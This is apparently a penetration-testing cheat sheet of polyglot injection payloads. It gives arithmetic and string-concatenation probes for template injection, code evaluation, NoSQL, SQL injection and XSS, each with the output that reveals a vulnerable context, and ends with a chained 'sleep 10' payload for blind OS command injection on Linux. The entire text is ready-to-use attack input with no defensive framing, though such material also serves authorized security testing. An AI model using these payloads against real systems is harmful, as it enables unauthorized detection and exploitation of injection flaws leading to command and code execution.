# Errors based/behaviour inferer

## PHP Numeric context for SSTi, evaluation, NoSQL, SQLi, XSS

`51201*3101.'><h1>@(\${{[%</h1>'` => `158774301`

## Other languages numeric context for SSTi, evaluation, NoSQL, SQLi, XSS

`51201*3101+'><h1>@(${{[%</h1>'` => `158774301`

## PHP String context for SSTi, evaluation, NoSQL, SQLi, XSS

``hello"."@(${{[%<%'**'><h1>asad2afdsd42sg</h1>`` => `' = hello@(\${{[%<%".">` && `" = hello'.'@(${{[%<%>`

## Other languages string context for SSTi, evaluation, NoSQL, SQLi, XSS

`hello"+"@(${{[%<%'**'><h1>asad2afdsd42sg</h1>` => `' = Generic Error Message (Fails to concat)` && `" = hello@(${{[%<%'**'> (Concats)`

`hello"%2b"%40(${{[%25<%25'**'><h1>asad2afdsd42sg</h1>`

## Context-Aware payload for OSCMDi in Linux

``$(sleep+10)+||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10+`sleep+10`";$(sleep+10)+`sleep+10`||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10"';sleep+10+%26%26sleep+10+||+sleep+10+|+sleep+10+`sleep+10`'``

``$(sleep 10) || sleep 10 | sleep 10; sleep 10 && sleep 10 `sleep 10`";$(sleep 10) `sleep 10`|| sleep 10 | sleep 10; sleep 10 && sleep 10"';sleep 10 && sleep 10 || sleep 10 | sleep 10 `sleep 10`'``
